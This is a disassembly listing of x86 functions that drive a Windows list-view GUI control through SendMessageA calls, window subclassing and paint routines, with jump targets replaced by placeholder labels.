mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_3adc05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adaec4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d9 ] 0x0
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3adeb68
mov eax [ ebp - 0x4 ]
call sub_3adeb50
xor edx edx
call sub_3ada4b4
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_3abec10
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_3adc05c
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_3adc05c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab7c38
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call __imp_SendMessageA
sub_3adc08c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_3abea4c
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_3abec10
jmp r-xdata
cmp esi [ ebx + 0x268 ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_3adc05c
jmp r-xdata
cmp esi [ ebx + 0x260 ]
jne r-xdata
cmp esi [ ebx + 0x26c ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_3adc05c
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_3adc05c
sub_3adc100
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab3c04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x260 ]
jne r-xdata
cmp esi [ edi + 0x268 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ade8ec
cmp esi [ edi + 0x26c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ade960
xor edx edx
mov eax edi
call sub_3ade9dc
sub_3adc174
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_3adc2ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b21c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ab7c38
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b21c
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x103b
push ebx
call __imp_SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_3adc28b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x32a ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adc292
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x2e5 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3adfb48
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_3adc2bc
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3adc334
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0x4 ]
push eax
push 0x318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call __imp_SendMessageA
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adc33b
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3adc344
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3adc4e9
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
sub eax 0x73
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a91b8c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2ac ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax esi
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2e5 ] 0x0
je r-xdata
mov eax esi
call sub_3ad0d70
mov edx [ ebp - 0x4 ]
call sub_3ad1094
test al al
je r-xdata
push ebp
call sub_3adc174
pop ecx
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call BeginPaint
xor edx edx
push ebp
push sub_3adc4a7
push [ fs : edx ]
mov [ fs : edx ] esp
push ebp
lea edx [ ebp - 0x3c ]
call sub_3adc2bc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call EndPaint
retn
sub_3adc50c
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3adc584
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0x4 ]
push eax
push 0x318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
call __imp_SendMessageA
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adc58b
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3adc594
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3adc752
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0xb04d
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x264 ] 0x0
jne r-xdata
add eax 0xffffff00
cmp eax 0x5
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a0 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3adc710
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
push 0x0
call MapWindowPoints
push ebp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3adc50c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x264 ] 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
push eax
call ReleaseDC
retn
jmp [ eax * 4 + jump_table_3adc5d4 ]
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab69e0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab6bd4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab6b0c
test al al
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3adc774
push ebx
push esi
push edi
mov edi ecx
mov esi edx
call sub_3ab7c38
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call __imp_SendMessageA
pop edi
pop esi
pop ebx
retn
sub_3adc794
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x26c ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x2c0 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_3ade9dc
cmp [ ebx + 0x2c3 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x2c6 ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x2c1 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x2c2 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x2c5 ] 0x1
je r-xdata
or esi 0x2000
movzx eax [ r-xdata ]
and al [ ebx + 0x2c5 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x2c5 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x2c5 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_3ab7c38
mov ebp eax
push esi
push 0x0
push 0x1036
push ebp
call __imp_SendMessageA
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_3ade9dc
sub_3adc89c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x278 ]
call sub_3adab94
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x298 ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x298 ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
movzx eax [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
pop edx
call sub_3ada52c
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0xc ]
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
movzx edx [ esp ]
call sub_3ada52c
jmp r-xdata
mov eax [ ebx + 0x298 ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_3adc928
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x298 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_3a7cc20
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x298 ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x298 ]
call sub_3a7cbbc
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x278 ]
call sub_3adab94
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
call sub_3ada4d8
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x298 ]
mov ebp [ eax ]
call [ ebp + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_3adc9ac
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
cmp dl [ ebx + 0x2c0 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x2c0 ] dl
mov eax ebx
call sub_3adc794
cmp [ ebx + 0x2c0 ] 0x0
je r-xdata
mov eax [ ebx + 0x278 ]
call sub_3adab94
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_3adc89c
jmp r-xdata
inc edi
xor esi esi
mov eax ebx
call sub_3ab7c38
mov ebp eax
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
call sub_3ada9f8
mov [ esp ] eax
push 0xf000
mov eax [ esp + 0x4 ]
push eax
push 0x102c
push ebp
call __imp_SendMessageA
shr eax 0xc
dec eax
mov ebp eax
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
test ebp ebp
setne dl
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_3adca74
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x2c5 ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x2c5 ] al
mov eax ebx
call sub_3adc794
sub_3adca9c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x290 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x278 ]
call sub_3adacb4
mov [ esi + 0x290 ] bl
mov eax esi
call sub_3ab4518
sub_3adcb40
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov cl 0x1
mov edx 0x3
call sub_3ada6fc
mov eax ebx
call sub_3adeb50
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3adeb50
xor ecx ecx
mov edx 0x3
call sub_3ada6fc
pop esi
pop ebx
retn
sub_3adcbb0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ab7c38
mov esi eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
mov ebx eax
push ebx
push 0x0
push 0x1024
push esi
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3adcbdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_3ab7c38
mov esi eax
mov eax [ ebx + 0x70 ]
call sub_3a88d54
mov edi eax
push edi
push 0x0
push 0x1026
push esi
call __imp_SendMessageA
mov eax ebx
call sub_3ab7c38
mov esi eax
mov eax [ ebx + 0x70 ]
call sub_3a88d54
mov ebx eax
push ebx
push 0x0
push 0x1001
push esi
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_3adcc28
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x2b4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x2b4 ] esi
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3ab7c38
push 0x0
push esi
push 0x102f
push eax
call __imp_SendMessageA
sub_3adcc60
push ebx
mov ebx eax
mov eax ebx
call sub_3ab713c
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_3adcbdc
sub_3adcc84
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x25c ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab7220
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab4518
sub_3adcca8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3adcec7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_3ab5d64
mov eax esi
call sub_3adcef8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adcece
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
cmp eax [ esi + 0x2b0 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ esi + 0x2e5 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax esi
call sub_3adfb48
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax esi
call sub_3adfb48
mov ebx eax
mov eax esi
call sub_3ab7c38
push 0x0
mov edx [ edi + 0xc ]
push edx
push 0x101d
push eax
call __imp_SendMessageA
mov edx eax
mov eax ebx
call sub_3ad9c1c
xor ecx ecx
xor edx edx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ ebx + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
call GetMessagePos
mov ebx eax
shr ebx 0x10
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0xc ]
movzx edx bx
call sub_3a67378
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_3aaf6c0
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax esi
call sub_3ab7c38
push eax
call ChildWindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax ebx
call sub_3ad9c1c
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax esi
call sub_3ab7c38
cmp ebx eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx 0x50
call sub_3a659c0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
push edi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push ebx
call GetClassNameA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_3a659c0
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_3aaf6c0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
push 0x0
mov eax esi
call sub_3ab7c38
push eax
call GetScrollPos
add [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push ebx
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_3adfb48
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax esi
mov si 0xffac
call sub_3a6457c
sub_3adcf04
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7164
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_3adcbb0
mov eax ebx
call sub_3adcef8
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x2b0 ]
push eax
call InvalidateRect
sub_3adcf6c
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x280 ]
movzx edx [ esi + 0x8 ]
mov eax ebx
call sub_3adb7c4
movzx edx [ esi + 0x9 ]
mov eax ebx
call sub_3adb7d8
movzx edx [ esi + 0xa ]
mov eax ebx
call sub_3adb7ec
pop esi
pop ebx
retn
sub_3adcf9c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x25d ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x25d ] dl
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
movzx eax [ ebx + 0x25d ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
mov eax ebx
call sub_3adee30
movzx eax [ ebx + 0x25d ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x280 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_3adee08
mov dl 0x3
mov eax ebx
call sub_3adee08
jmp r-xdata
sub_3add020
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab6dd8
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2b0 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x2b0 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x2ac ] eax
mov eax [ ebx + 0x2a8 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x2b0 ]
push eax
call SetWindowLongA
sub_3add070
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_3adeb50
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3adeb50
call sub_3ada9f8
mov esi eax
sub_3add098
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
mov al 0x1
pop ebx
retn
sub_3add0c0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x362 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
movzx ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_3add10c
push ebx
cmp [ eax + 0x36a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov al 0x1
pop ebx
retn
sub_3add134
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x372 ] 0x0
je r-xdata
xor eax eax
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
movzx ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_3add16c
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x3c2 ] 0x0
je r-xdata
mov ecx [ ebx + 0x278 ]
mov dl 0x1
mov eax [ esp ]
call sub_3ada3a8
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x3c4 ]
call [ ebx + 0x3c0 ]
sub_3add1b8
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_3add204
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_3add326
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x290 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x278 ]
call sub_3adabcc
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3add32d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x2dc ]
jmp r-xdata
mov eax ebx
call sub_3add1b8
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x2dc ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a652a0
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x2dc ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_3a6a360
jmp r-xdata
movzx ecx [ ebp - 0x5 ]
mov edx [ esi + 0x2dc ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x124 ]
mov ebx [ esi + 0x2dc ]
jmp r-xdata
mov eax [ esi + 0x2dc ]
mov edx [ ebp - 0x9 ]
